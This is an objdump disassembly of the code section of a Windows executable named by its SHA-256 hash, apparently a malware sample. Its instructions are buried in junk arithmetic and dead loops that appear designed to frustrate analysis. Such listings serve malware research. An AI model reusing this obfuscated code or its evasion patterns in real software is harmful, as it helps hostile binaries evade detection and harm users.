
462eb5d55e5777d4de5f5ca47307e9cf491d0cff4d4fbab5831b1f18440592da.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x108
  401009:	push   esi
  40100a:	lea    eax,[ebp-0xc4]
  401010:	push   eax
  401011:	add    DWORD PTR ds:0x435000,0x438000
  40101b:	push   0xf
  40101d:	sub    DWORD PTR ds:0x43701c,0x435018
  401027:	call   DWORD PTR ds:0x43a8d8
  40102d:	xor    DWORD PTR ds:0x434020,0x437010
  401037:	push   0x43a3e4
  40103c:	inc    DWORD PTR ds:0x435010
  401042:	xor    esi,esi
  401044:	inc    esi
  401045:	mov    DWORD PTR ds:0x434000,0x5c4e
  40104f:	push   esi
  401050:	dec    DWORD PTR ds:0x43401c
  401056:	push   esi
  401057:	and    DWORD PTR ds:0x438004,0x43501c
  401061:	call   DWORD PTR ds:0x43a8ec
  401067:	xor    DWORD PTR ds:0x438000,0x435010
  401071:	test   eax,eax
  401073:	mov    DWORD PTR ds:0x436018,0x4ead
  40107d:	je     0x401094
  401083:	xor    eax,eax
  401085:	mov    DWORD PTR ds:0x435008,0x2c45
  40108f:	jmp    0x40258f
  401094:	push   ebx
  401095:	xor    DWORD PTR ds:0x435008,ecx
  40109b:	mov    ebx,DWORD PTR ds:0x43a8cc
  4010a1:	inc    DWORD PTR ds:0x434004
  4010a7:	push   0x9
  4010a9:	add    DWORD PTR ds:0x434024,0x434008
  4010b3:	push   0x43a3fc
  4010b8:	call   ebx
  4010ba:	and    DWORD PTR ds:0x43800c,0x434000
  4010c4:	test   eax,eax
  4010c6:	je     0x4010ef
  4010cc:	sbb    DWORD PTR ds:0x435010,0x438014
  4010d6:	lea    eax,[ebp-0x20]
  4010d9:	push   eax
  4010da:	or     DWORD PTR ds:0x43601c,0x436010
  4010e4:	call   DWORD PTR ds:0x43a8bc
  4010ea:	jmp    0x40258e
  4010ef:	push   edi
  4010f0:	inc    edi
  4010f1:	mov    edi,DWORD PTR ds:0x43a8fc
  4010f7:	push   0x43a418
  4010fc:	adc    DWORD PTR ds:0x43401c,0x6c9b
  401106:	push   esi
  401107:	push   esi
  401108:	or     DWORD PTR ds:0x434018,0x43401c
  401112:	call   edi
  401114:	and    DWORD PTR ds:0x436004,0x434004
  40111e:	test   eax,eax
  401120:	mov    DWORD PTR ds:0x436000,0x329d
  40112a:	jne    0x40241c
  401130:	mov    esi,DWORD PTR ds:0x43a908
  401136:	or     DWORD PTR ds:0x436000,0x434018
  401140:	push   0xd
  401142:	sbb    DWORD PTR ds:0x435000,0x435010
  40114c:	push   0x43a428
  401151:	adc    DWORD PTR ds:0x43601c,0x44f1
  40115b:	call   esi
  40115d:	test   eax,eax
  40115f:	mov    DWORD PTR ds:0x43801c,0x3c7b
  401169:	je     0x401230
  40116f:	or     DWORD PTR ds:0x434028,0x4ff1
  401179:	push   0x43a43c
  40117e:	xor    DWORD PTR ds:0x434004,0x7bc9
  401188:	push   0x1
  40118a:	push   0x1
  40118c:	sub    DWORD PTR ds:0x435014,0x4cb8
  401196:	call   DWORD PTR ds:0x43a8ec
  40119c:	adc    DWORD PTR ds:0x43600c,0x5c72
  4011a6:	test   eax,eax
  4011a8:	jne    0x402440
  4011ae:	push   0x9
  4011b0:	push   0x43a454
  4011b5:	call   ebx
  4011b7:	xor    DWORD PTR ds:0x434020,0x434004
  4011c1:	test   eax,eax
  4011c3:	mov    DWORD PTR ds:0x43501c,0x26a9
  4011cd:	jne    0x40241c
  4011d3:	add    DWORD PTR ds:0x43400c,0x437000
  4011dd:	push   0x43a470
  4011e2:	or     DWORD PTR ds:0x436004,0x437018
  4011ec:	push   0x1
  4011ee:	push   0x1
  4011f0:	call   edi
  4011f2:	xor    DWORD PTR ds:0x43501c,0xa21
  4011fc:	test   eax,eax
  4011fe:	jne    0x40241c
  401204:	and    DWORD PTR ds:0x435014,0x437004
  40120e:	push   0xd
  401210:	push   0x43a480
  401215:	sbb    DWORD PTR ds:0x436010,0x7182
  40121f:	call   esi
  401221:	mov    DWORD PTR ds:0x436004,0x55a5
  40122b:	jmp    0x402440
  401230:	mov    DWORD PTR [ebp-0x10],0x0
  401237:	add    DWORD PTR ds:0x436008,ecx
  40123d:	mov    eax,DWORD PTR [ebp-0x3c]
  401240:	mov    DWORD PTR [ebp-0x3c],eax
  401243:	mov    DWORD PTR [ebp-0x8],0xf89c8585
  40124a:	add    DWORD PTR ds:0x43700c,0x15f
  401254:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  40125b:	lea    eax,[ebp-0x44]
  40125e:	mov    edi,DWORD PTR ds:0x416574
  401264:	mov    ecx,DWORD PTR ds:0x416578
  40126a:	sub    edi,ecx
  40126c:	sub    edi,DWORD PTR [edi+ecx*1]
  40126f:	mov    DWORD PTR [ebp-0x38],eax
  401272:	xor    DWORD PTR ds:0x43500c,ecx
  401278:	lea    eax,[ebp-0x48]
  40127b:	mov    DWORD PTR [ebp-0x18],eax
  40127e:	xor    edi,edi
  401280:	add    edi,DWORD PTR ds:0x434008
  401286:	xor    DWORD PTR ds:0x435014,edi
  40128c:	mov    eax,ds:0x43a2d4
  401291:	mov    eax,DWORD PTR [eax+0x1c8]
  401297:	movzx  esi,BYTE PTR ds:0x43501c
  40129e:	or     esi,DWORD PTR ds:0x437004
  4012a4:	mov    DWORD PTR ds:0x43501c,esi
  4012aa:	mov    eax,DWORD PTR [eax]
  4012ac:	mov    ecx,DWORD PTR [ebp-0x18]
  4012af:	mov    esi,0x751089b
  4012b4:	add    DWORD PTR ds:0x438008,0x58e0
  4012be:	xor    eax,esi
  4012c0:	xor    DWORD PTR ds:0x434008,edi
  4012c6:	mov    edi,0x3272e2
  4012cb:	and    DWORD PTR ds:0x434000,0x437010
  4012d5:	add    eax,edi
  4012d7:	mov    DWORD PTR [ecx],eax
  4012d9:	mov    eax,ds:0x43a724
  4012de:	cmp    eax,0x312bc9f6
  4012e3:	jne    0x401370
  4012e9:	sbb    DWORD PTR ds:0x436010,0x463c
  4012f3:	mov    eax,DWORD PTR [ebp-0x8]
  4012f6:	mov    ecx,DWORD PTR ds:0x43a2d4
  4012fc:	inc    ebx
  4012fd:	mov    ecx,DWORD PTR [ecx+0x198]
  401303:	xor    eax,esi
  401305:	add    DWORD PTR ds:0x43701c,0x3b79
  40130f:	add    eax,edi
  401311:	mov    DWORD PTR [ecx],eax
  401313:	neg    DWORD PTR ds:0x436008
  401319:	mov    eax,DWORD PTR [ebp-0x8]
  40131c:	xor    eax,esi
  40131e:	and    DWORD PTR ds:0x437008,0x0
  401328:	jmp    0x40133a
  40132d:	mov    ebx,DWORD PTR ds:0x437008
  401333:	inc    ebx
  401334:	mov    DWORD PTR ds:0x437008,ebx
  40133a:	cmp    DWORD PTR ds:0x437008,0x12
  401341:	jae    0x401369
  401347:	cmp    DWORD PTR ds:0x437008,0x17
  40134e:	jg     0x401369
  401354:	jmp    0x401364
  401359:	push   0x426b
  40135e:	call   DWORD PTR ds:0x43a8c4
  401364:	jmp    0x40132d
  401369:	add    eax,edi
  40136b:	mov    ds:0x43a724,eax
  401370:	mov    eax,ds:0x43a2d4
  401375:	add    ebx,0x1d59
  40137b:	mov    eax,DWORD PTR [eax+0x18c]
  401381:	mov    eax,DWORD PTR [eax]
  401383:	mov    ebx,DWORD PTR ds:0x416538
  401389:	mov    ebx,DWORD PTR [ebx]
  40138b:	and    DWORD PTR ds:0x436004,ebx
  401391:	mov    DWORD PTR [ebp-0x7c],eax
  401394:	mov    eax,ds:0x416530
  401399:	mov    ebx,DWORD PTR ds:0x4165b8
  40139f:	sub    eax,ebx
  4013a1:	sub    eax,DWORD PTR [eax+ebx*1]
  4013a4:	mov    eax,0xf89c85b9
  4013a9:	mov    DWORD PTR [ebp-0x10],eax
  4013ac:	sbb    DWORD PTR ds:0x43500c,ebx
  4013b2:	mov    DWORD PTR [ebp-0x10],eax
  4013b5:	adc    DWORD PTR ds:0x436008,edx
  4013bb:	mov    DWORD PTR [ebp-0x10],eax
  4013be:	mov    DWORD PTR ds:0x434000,0x12
  4013c8:	cmp    DWORD PTR ds:0x434000,0x0
  4013cf:	je     0x401402
  4013d5:	cmp    DWORD PTR ds:0x434000,0x17
  4013dc:	jg     0x401402
  4013e2:	jmp    0x4013f0
  4013e7:	push   DWORD PTR [ebp-0x14]
  4013ea:	call   DWORD PTR ds:0x43a8c8
  4013f0:	mov    ebx,DWORD PTR ds:0x434000
  4013f6:	dec    ebx
  4013f7:	mov    DWORD PTR ds:0x434000,ebx
  4013fd:	jmp    0x4013c8
  401402:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  401409:	and    DWORD PTR ds:0x436004,0x0
  401413:	jmp    0x401425
  401418:	mov    ebx,DWORD PTR ds:0x436004
  40141e:	inc    ebx
  40141f:	mov    DWORD PTR ds:0x436004,ebx
  401425:	cmp    DWORD PTR ds:0x436004,0x15
  40142c:	jae    0x401454
  401432:	cmp    DWORD PTR ds:0x436004,0x1c
  401439:	ja     0x401454
  40143f:	jmp    0x40144f
  401444:	push   0x43a097
  401449:	call   DWORD PTR ds:0x43a8d0
  40144f:	jmp    0x401418
  401454:	mov    DWORD PTR [ebp-0x10],eax
  401457:	adc    ebx,0x4a4f
  40145d:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401464:	movzx  ebx,WORD PTR ds:0x434000
  40146b:	xor    ebx,DWORD PTR ds:0x438000
  401471:	mov    DWORD PTR ds:0x434000,ebx
  401477:	mov    ebx,DWORD PTR [ebp-0x8]
  40147a:	xor    ebx,esi
  40147c:	or     DWORD PTR ds:0x436000,0x43801c
  401486:	add    ebx,edi
  401488:	mov    DWORD PTR ds:0x434004,0x16bd
  401492:	jmp    0x401599
  401497:	adc    eax,DWORD PTR ds:0x437010
  40149d:	mov    eax,DWORD PTR [ebp-0xc]
  4014a0:	add    DWORD PTR ds:0x43600c,0x435004
  4014aa:	xor    eax,esi
  4014ac:	sub    DWORD PTR ds:0x434024,0x438008
  4014b6:	lea    eax,[eax+ebx*1+0x3272e2]
  4014bd:	or     DWORD PTR ds:0x43401c,0x36
  4014c7:	push   eax
  4014c8:	neg    DWORD PTR ds:0x43401c
  4014ce:	mov    eax,DWORD PTR [ebp-0x18]
  4014d1:	xor    eax,esi
  4014d3:	adc    DWORD PTR ds:0x437004,0x7bd1
  4014dd:	lea    eax,[ebp+eax*1+0x3272ea]
  4014e4:	or     DWORD PTR ds:0x434028,0x5a2b
  4014ee:	push   eax
  4014ef:	and    DWORD PTR ds:0x435010,0x0
  4014f9:	jmp    0x401509
  4014fe:	mov    eax,ds:0x435010
  401503:	inc    eax
  401504:	mov    ds:0x435010,eax
  401509:	cmp    DWORD PTR ds:0x435010,0x1b
  401510:	jae    0x401550
  401516:	cmp    DWORD PTR ds:0x435010,0x8
  40151d:	jl     0x401550
  401523:	jmp    0x401533
  401528:	push   0x43a111
  40152d:	call   DWORD PTR ds:0x43a8d4
  401533:	cmp    DWORD PTR ds:0x435010,0x7
  40153a:	jne    0x40154b
  401540:	mov    eax,ds:0x435010
  401545:	inc    eax
  401546:	mov    ds:0x435010,eax
  40154b:	jmp    0x4014fe
  401550:	mov    eax,ds:0x43a2d4
  401555:	sub    DWORD PTR ds:0x438000,0x71a4
  40155f:	push   DWORD PTR [eax+0x1bc]
  401565:	adc    DWORD PTR ds:0x436008,0x7f70
  40156f:	call   0x402598
  401574:	movzx  ecx,BYTE PTR ds:0x434020
  40157b:	sbb    DWORD PTR ds:0x434008,ecx
  401581:	mov    eax,DWORD PTR [ebp-0xc]
  401584:	adc    ecx,DWORD PTR ds:0x438018
  40158a:	xor    eax,esi
  40158c:	sbb    ecx,DWORD PTR ds:0x437000
  401592:	lea    ebx,[ebx+eax*1+0x3272e2]
  401599:	mov    ecx,DWORD PTR ds:0x434018
  40159f:	add    DWORD PTR ds:0x436000,ecx
  4015a5:	mov    eax,DWORD PTR [ebp-0xc]
  4015a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ab:	adc    DWORD PTR ds:0x43801c,0x43400c
  4015b5:	xor    ecx,esi
  4015b7:	xor    DWORD PTR ds:0x43800c,0x6ae7
  4015c1:	xor    eax,esi
  4015c3:	add    eax,ecx
  4015c5:	xor    ecx,0x639d
  4015cb:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ce:	sbb    DWORD PTR ds:0x437004,0x435008
  4015d8:	xor    ecx,esi
  4015da:	lea    eax,[eax+ecx*1+0x9758a6]
  4015e1:	mov    DWORD PTR ds:0x437018,0x6f5b
  4015eb:	cmp    ebx,eax
  4015ed:	jbe    0x401497
  4015f3:	mov    eax,DWORD PTR [ebp+0xc]
  4015f6:	and    DWORD PTR ds:0x43601c,ebx
  4015fc:	mov    ds:0x43a158,eax
  401601:	mov    eax,DWORD PTR [ebp+0x10]
  401604:	mov    DWORD PTR ds:0x435004,0xee9
  40160e:	mov    ds:0x43a3ac,eax
  401613:	sbb    DWORD PTR ds:0x436000,ebx
  401619:	mov    eax,ds:0x43a158
  40161e:	neg    ecx
  401620:	mov    ecx,DWORD PTR [ebp-0x38]
  401623:	sub    eax,edi
  401625:	xor    eax,esi
  401627:	mov    DWORD PTR ds:0x438010,0x5a04
  401631:	mov    DWORD PTR [ecx],eax
  401633:	mov    DWORD PTR ds:0x438010,ecx
  401639:	mov    eax,DWORD PTR [ebp-0x3c]
  40163c:	mov    DWORD PTR ds:0x43701c,0x1a94
  401646:	cmp    eax,0xf89c8585
  40164b:	mov    DWORD PTR ds:0x43501c,0x7d63
  401655:	jne    0x401b36
  40165b:	or     DWORD PTR ds:0x43400c,0x43501c
  401665:	push   0x43a494
  40166a:	xor    ebx,ebx
  40166c:	mov    DWORD PTR ds:0x43700c,0x6301
  401676:	inc    ebx
  401677:	and    DWORD PTR ds:0x437014,0x438000
  401681:	push   ebx
  401682:	push   ebx
  401683:	adc    DWORD PTR ds:0x436010,0x6629
  40168d:	call   DWORD PTR ds:0x43a8ec
  401693:	or     DWORD PTR ds:0x435008,0x107f
  40169d:	test   eax,eax
  40169f:	jne    0x402440
  4016a5:	xor    DWORD PTR ds:0x434014,0x437000
  4016af:	push   0x9
  4016b1:	push   0x43a4ac
  4016b6:	xor    DWORD PTR ds:0x43701c,0x434028
  4016c0:	call   DWORD PTR ds:0x43a8cc
  4016c6:	test   eax,eax
  4016c8:	jne    0x40241c
  4016ce:	adc    DWORD PTR ds:0x438010,0x6458
  4016d8:	push   0x43a4c8
  4016dd:	push   ebx
  4016de:	push   ebx
  4016df:	call   DWORD PTR ds:0x43a8fc
  4016e5:	test   eax,eax
  4016e7:	mov    DWORD PTR ds:0x434014,0x6a9b
  4016f1:	jne    0x40241c
  4016f7:	add    DWORD PTR ds:0x434018,0x437004
  401701:	push   0xd
  401703:	neg    DWORD PTR ds:0x438004
  401709:	push   0x43a4d8
  40170e:	and    DWORD PTR ds:0x435010,0x62ab
  401718:	call   DWORD PTR ds:0x43a908
  40171e:	or     DWORD PTR ds:0x435008,0x43600c
  401728:	test   eax,eax
  40172a:	jne    0x402440
  401730:	sbb    DWORD PTR ds:0x436010,0x438018
  40173a:	lea    eax,[ebp-0x34]
  40173d:	sub    DWORD PTR ds:0x43500c,0x6999
  401747:	mov    DWORD PTR [ebp-0x9c],eax
  40174d:	lea    eax,[ebp+0x4]
  401750:	or     DWORD PTR ds:0x43700c,0x43601c
  40175a:	mov    DWORD PTR [ebp-0x34],eax
  40175d:	xor    eax,DWORD PTR ds:0x43600c
  401763:	mov    eax,DWORD PTR [ebp-0x34]
  401766:	and    DWORD PTR ds:0x43401c,0x436018
  401770:	test   eax,eax
  401772:	je     0x402572
  401778:	xor    eax,ecx
  40177a:	mov    eax,DWORD PTR [ebp-0x28]
  40177d:	mov    eax,DWORD PTR [ebp-0xc]
  401780:	xor    DWORD PTR ds:0x434008,0x3c87
  40178a:	mov    eax,DWORD PTR [ebp-0x8]
  40178d:	and    DWORD PTR ds:0x434008,0x0
  401797:	xor    ecx,ecx
  401799:	add    ecx,DWORD PTR ds:0x434008
  40179f:	inc    ecx
  4017a0:	mov    DWORD PTR ds:0x434008,ecx
  4017a6:	cmp    DWORD PTR ds:0x434008,0x23
  4017ad:	jbe    0x4017ce
  4017b3:	jmp    0x4017c1
  4017b8:	push   DWORD PTR [ebp-0x20]
  4017bb:	call   DWORD PTR ds:0x43a8dc
  4017c1:	cmp    DWORD PTR ds:0x434008,0x15
  4017c8:	jb     0x401797
  4017ce:	mov    DWORD PTR [ebp+0xc],eax
  4017d1:	mov    DWORD PTR ds:0x43400c,0x1d
  4017db:	cmp    DWORD PTR ds:0x43400c,0x0
  4017e2:	je     0x40183c
  4017e8:	cmp    DWORD PTR ds:0x43400c,0x3
  4017ef:	ja     0x40183c
  4017f5:	jmp    0x40180e
  4017fa:	push   0x43a0c9
  4017ff:	push   DWORD PTR [ebp-0x18]
  401802:	push   DWORD PTR [ebp-0x28]
  401805:	push   DWORD PTR [ebp-0x1c]
  401808:	call   DWORD PTR ds:0x43a8e0
  40180e:	cmp    DWORD PTR ds:0x43400c,0x4
  401815:	jne    0x40182a
  40181b:	xor    ecx,ecx
  40181d:	add    ecx,DWORD PTR ds:0x43400c
  401823:	dec    ecx
  401824:	mov    DWORD PTR ds:0x43400c,ecx
  40182a:	mov    ecx,DWORD PTR ds:0x43400c
  401830:	dec    ecx
  401831:	mov    DWORD PTR ds:0x43400c,ecx
  401837:	jmp    0x4017db
  40183c:	mov    eax,eax
  40183e:	and    DWORD PTR ds:0x43401c,0x0
  401848:	jmp    0x40185c
  40184d:	xor    ecx,ecx
  40184f:	add    ecx,DWORD PTR ds:0x43401c
  401855:	inc    ecx
  401856:	mov    DWORD PTR ds:0x43401c,ecx
  40185c:	cmp    DWORD PTR ds:0x43401c,0x14
  401863:	jae    0x4018b6
  401869:	cmp    DWORD PTR ds:0x43401c,0x9
  401870:	jge    0x4018b6
  401876:	jmp    0x401897
  40187b:	push   DWORD PTR [ebp-0x14]
  40187e:	push   0x434004
  401883:	push   DWORD PTR [ebp-0x24]
  401886:	push   0x43a07b
  40188b:	push   DWORD PTR [ebp-0x20]
  40188e:	push   DWORD PTR [ebp-0x18]
  401891:	call   DWORD PTR ds:0x43a8e4
  401897:	cmp    DWORD PTR ds:0x43401c,0x8
  40189e:	jne    0x4018b1
  4018a4:	mov    ecx,DWORD PTR ds:0x43401c
  4018aa:	inc    ecx
  4018ab:	mov    DWORD PTR ds:0x43401c,ecx
  4018b1:	jmp    0x40184d
  4018b6:	mov    eax,ds:0x43a2d4
  4018bb:	or     DWORD PTR ds:0x434008,0x6b78
  4018c5:	mov    eax,DWORD PTR [eax+0x1c8]
  4018cb:	mov    eax,DWORD PTR [eax]
  4018cd:	mov    DWORD PTR ds:0x43400c,0x1f
  4018d7:	cmp    DWORD PTR ds:0x43400c,0x0
  4018de:	je     0x40191e
  4018e4:	cmp    DWORD PTR ds:0x43400c,0x21
  4018eb:	jbe    0x40191e
  4018f1:	jmp    0x40190a
  4018f6:	push   0x1259
  4018fb:	push   DWORD PTR [ebp-0x10]
  4018fe:	push   DWORD PTR [ebp-0x28]
  401901:	push   DWORD PTR [ebp-0xc]
  401904:	call   DWORD PTR ds:0x43a8e8
  40190a:	xor    ecx,ecx
  40190c:	xor    ecx,DWORD PTR ds:0x43400c
  401912:	dec    ecx
  401913:	mov    DWORD PTR ds:0x43400c,ecx
  401919:	jmp    0x4018d7
  40191e:	cdq    
  40191f:	mov    ebx,eax
  401921:	mov    DWORD PTR ds:0x435000,0x1d
  40192b:	cmp    DWORD PTR ds:0x435000,0x0
  401932:	je     0x401964
  401938:	cmp    DWORD PTR ds:0x435000,0x28
  40193f:	ja     0x401964
  401945:	jmp    0x401950
  40194a:	call   DWORD PTR ds:0x43a8f0
  401950:	xor    ecx,ecx
  401952:	add    ecx,DWORD PTR ds:0x435000
  401958:	dec    ecx
  401959:	mov    DWORD PTR ds:0x435000,ecx
  40195f:	jmp    0x40192b
  401964:	mov    eax,0xfabdbee7
  401969:	add    ebx,eax
  40196b:	mov    DWORD PTR ds:0x43501c,ebx
  401971:	adc    edx,0xffffffff
  401974:	and    ecx,DWORD PTR ds:0x434018
  40197a:	and    DWORD PTR [ebp-0x10],0x0
  40197e:	xor    edx,0x0
  401981:	mov    DWORD PTR [ebp-0x6c],edx
  401984:	mov    edx,DWORD PTR [ebp+0xc]
  401987:	mov    DWORD PTR [ebp-0x14],edx
  40198a:	and    ecx,edx
  40198c:	mov    ecx,0x8a29a12d
  401991:	and    DWORD PTR ds:0x437018,0x6956
  40199b:	xor    ebx,ecx
  40199d:	add    DWORD PTR [ebp-0x14],eax
  4019a0:	mov    edx,DWORD PTR [ebp-0x14]
  4019a3:	mov    DWORD PTR ds:0x437018,0xe51
  4019ad:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4019b1:	adc    DWORD PTR ds:0x43401c,0x434014
  4019bb:	xor    edx,ecx
  4019bd:	sub    DWORD PTR ds:0x438018,0x437000
  4019c7:	mov    DWORD PTR [ebp-0x5c],edx
  4019ca:	mov    edx,DWORD PTR [ebp-0x10]
  4019cd:	xor    edx,0x0
  4019d0:	mov    DWORD PTR [ebp-0x58],edx
  4019d3:	mov    DWORD PTR ds:0x43600c,0x7e33
  4019dd:	cmp    DWORD PTR [ebp-0x5c],ebx
  4019e0:	mov    DWORD PTR ds:0x434010,0x71c9
  4019ea:	jne    0x401a0c
  4019f0:	mov    edx,DWORD PTR ds:0x434004
  4019f6:	mov    edx,DWORD PTR [ebp-0x6c]
  4019f9:	cmp    DWORD PTR [ebp-0x58],edx
  4019fc:	mov    DWORD PTR ds:0x43600c,0x7cc1
  401a06:	je     0x401aa7
  401a0c:	mov    DWORD PTR ds:0x434018,0x1c
  401a16:	cmp    DWORD PTR ds:0x434018,0x0
  401a1d:	je     0x401a50
  401a23:	cmp    DWORD PTR ds:0x434018,0x29
  401a2a:	jbe    0x401a50
  401a30:	jmp    0x401a3e
  401a35:	push   DWORD PTR [ebp-0x28]
  401a38:	call   DWORD PTR ds:0x43a8f4
  401a3e:	mov    edx,DWORD PTR ds:0x434018
  401a44:	dec    edx
  401a45:	mov    DWORD PTR ds:0x434018,edx
  401a4b:	jmp    0x401a16
  401a50:	mov    edx,DWORD PTR ds:0x43a2d4
  401a56:	or     DWORD PTR ds:0x436018,0x438010
  401a60:	mov    edx,DWORD PTR [edx+0x1c0]
  401a66:	add    DWORD PTR ds:0x434018,0x436004
  401a70:	mov    edx,DWORD PTR [edx]
  401a72:	xor    ebx,ebx
  401a74:	add    edx,eax
  401a76:	adc    ebx,0xffffffff
  401a79:	xor    edx,ecx
  401a7b:	xor    ebx,0x0
  401a7e:	cmp    edx,0x70941fc5
  401a84:	mov    DWORD PTR ds:0x438014,0x6222
  401a8e:	jne    0x402572
  401a94:	cmp    ebx,0xffffffff
  401a97:	mov    DWORD PTR ds:0x436010,0x168c
  401aa1:	jne    0x402572
  401aa7:	mov    edx,DWORD PTR ds:0x43a350
  401aad:	or     DWORD PTR ds:0x43501c,0x338f
  401ab7:	mov    ebx,DWORD PTR ds:0x43a358
  401abd:	sbb    DWORD PTR ds:0x43501c,0x434008
  401ac7:	xor    edx,ebx
  401ac9:	and    DWORD PTR ds:0x438000,0x0
  401ad3:	jmp    0x401ae5
  401ad8:	mov    ebx,DWORD PTR ds:0x438000
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x438000,ebx
  401ae5:	cmp    DWORD PTR ds:0x438000,0x1a
  401aec:	jae    0x401b17
  401af2:	cmp    DWORD PTR ds:0x438000,0x29
  401af9:	jl     0x401b17
  401aff:	jmp    0x401b12
  401b04:	push   0x4320
  401b09:	push   DWORD PTR [ebp-0x28]
  401b0c:	call   DWORD PTR ds:0x43a8f8
  401b12:	jmp    0x401ad8
  401b17:	mov    DWORD PTR ds:0x43a350,edx
  401b1d:	mov    edx,DWORD PTR [ebp-0x34]
  401b20:	mov    ebx,DWORD PTR ds:0x43a350
  401b26:	add    ebx,DWORD PTR [edx]
  401b28:	not    DWORD PTR ds:0x43801c
  401b2e:	mov    edx,DWORD PTR [ebp-0x34]
  401b31:	jmp    0x402531
  401b36:	mov    eax,DWORD PTR [ebp-0x44]
  401b39:	mov    DWORD PTR ds:0x436000,0x3783
  401b43:	cmp    eax,0xf89c8584
  401b48:	mov    DWORD PTR ds:0x434000,0x66dd
  401b52:	je     0x401d61
  401b58:	xor    eax,eax
  401b5a:	xor    eax,DWORD PTR ds:0x434018
  401b60:	adc    eax,DWORD PTR ds:0x434024
  401b66:	mov    ds:0x434018,eax
  401b6b:	mov    eax,DWORD PTR [ebp-0x8]
  401b6e:	mov    ecx,DWORD PTR [ebp-0x48]
  401b71:	xor    eax,esi
  401b73:	add    eax,edi
  401b75:	mov    DWORD PTR ds:0x436004,0x39e8
  401b7f:	cmp    eax,ecx
  401b81:	mov    DWORD PTR ds:0x434018,0x5d7a
  401b8b:	je     0x401d61
  401b91:	xor    DWORD PTR ds:0x434000,0x3742
  401b9b:	push   0x43a5f4
  401ba0:	xor    esi,esi
  401ba2:	inc    esi
  401ba3:	sbb    DWORD PTR ds:0x43801c,0x434008
  401bad:	push   esi
  401bae:	sub    DWORD PTR ds:0x43701c,0x437018
  401bb8:	push   esi
  401bb9:	adc    DWORD PTR ds:0x436004,0x30fb
  401bc3:	call   DWORD PTR ds:0x43a8ec
  401bc9:	or     DWORD PTR ds:0x435000,0x43400c
  401bd3:	test   eax,eax
  401bd5:	mov    DWORD PTR ds:0x437010,0x752e
  401bdf:	jne    0x402440
  401be5:	mov    DWORD PTR ds:0x43501c,0xd2c
  401bef:	push   0x9
  401bf1:	add    DWORD PTR ds:0x43500c,0x3ba4
  401bfb:	push   0x43a60c
  401c00:	call   DWORD PTR ds:0x43a8cc
  401c06:	test   eax,eax
  401c08:	jne    0x40241c
  401c0e:	and    DWORD PTR ds:0x43401c,0x438010
  401c18:	push   0x43a628
  401c1d:	push   esi
  401c1e:	push   esi
  401c1f:	sbb    DWORD PTR ds:0x436000,0x437014
  401c29:	call   DWORD PTR ds:0x43a8fc
  401c2f:	or     DWORD PTR ds:0x43400c,0x434020
  401c39:	test   eax,eax
  401c3b:	mov    DWORD PTR ds:0x438018,0x4ca0
  401c45:	jne    0x40241c
  401c4b:	push   0xd
  401c4d:	add    DWORD PTR ds:0x437000,0x43400c
  401c57:	push   0x43a638
  401c5c:	call   DWORD PTR ds:0x43a908
  401c62:	add    DWORD PTR ds:0x437018,0x7176
  401c6c:	test   eax,eax
  401c6e:	jne    0x402440
  401c74:	mov    DWORD PTR ds:0x436000,0x1e
  401c7e:	cmp    DWORD PTR ds:0x436000,0x0
  401c85:	je     0x401cd4
  401c8b:	cmp    DWORD PTR ds:0x436000,0x10
  401c92:	jle    0x401cd4
  401c98:	jmp    0x401ca8
  401c9d:	push   0x435014
  401ca2:	call   DWORD PTR ds:0x43a900
  401ca8:	cmp    DWORD PTR ds:0x436000,0x11
  401caf:	jne    0x401cc2
  401cb5:	mov    ecx,DWORD PTR ds:0x436000
  401cbb:	dec    ecx
  401cbc:	mov    DWORD PTR ds:0x436000,ecx
  401cc2:	mov    ecx,DWORD PTR ds:0x436000
  401cc8:	dec    ecx
  401cc9:	mov    DWORD PTR ds:0x436000,ecx
  401ccf:	jmp    0x401c7e
  401cd4:	mov    eax,ds:0x43a2d4
  401cd9:	mov    ecx,DWORD PTR ds:0x435004
  401cdf:	or     DWORD PTR ds:0x438010,ecx
  401ce5:	mov    eax,DWORD PTR [eax+0x194]
  401ceb:	mov    ecx,DWORD PTR [eax]
  401ced:	mov    eax,DWORD PTR [ecx+0x3c]
  401cf0:	push   DWORD PTR ds:0x43a3ac
  401cf6:	mov    DWORD PTR ds:0x435014,0x6873
  401d00:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401d04:	push   DWORD PTR ds:0x43a158
  401d0a:	mov    DWORD PTR ds:0x43400c,0x7a94
  401d14:	add    eax,ecx
  401d16:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d1c:	or     DWORD PTR ds:0x437010,0x5a23
  401d26:	mov    ecx,DWORD PTR [ecx+0x194]
  401d2c:	mov    DWORD PTR ds:0x436008,0x65e8
  401d36:	push   DWORD PTR [ecx]
  401d38:	sbb    DWORD PTR ds:0x43401c,0x5228
  401d42:	call   eax
  401d44:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d4a:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d50:	mov    DWORD PTR ds:0x437014,0xc7a
  401d5a:	mov    DWORD PTR [ecx],eax
  401d5c:	jmp    0x402572
  401d61:	adc    DWORD PTR ds:0x43700c,0x4142
  401d6b:	push   0x43a4ec
  401d70:	adc    DWORD PTR ds:0x435008,0x3813
  401d7a:	xor    ebx,ebx
  401d7c:	sbb    DWORD PTR ds:0x43801c,0x3514
  401d86:	inc    ebx
  401d87:	not    DWORD PTR ds:0x435008
  401d8d:	push   ebx
  401d8e:	push   ebx
  401d8f:	call   DWORD PTR ds:0x43a8ec
  401d95:	or     DWORD PTR ds:0x436010,0x434018
  401d9f:	test   eax,eax
  401da1:	mov    DWORD PTR ds:0x437008,0x71b6
  401dab:	jne    0x402440
  401db1:	or     DWORD PTR ds:0x438010,0x434014
  401dbb:	push   0x9
  401dbd:	add    DWORD PTR ds:0x437008,0x6ead
  401dc7:	push   0x43a504
  401dcc:	add    DWORD PTR ds:0x437010,0x12d1
  401dd6:	call   DWORD PTR ds:0x43a8cc
  401ddc:	add    DWORD PTR ds:0x434014,0x5154
  401de6:	test   eax,eax
  401de8:	mov    DWORD PTR ds:0x43600c,0xb65
  401df2:	jne    0x40241c
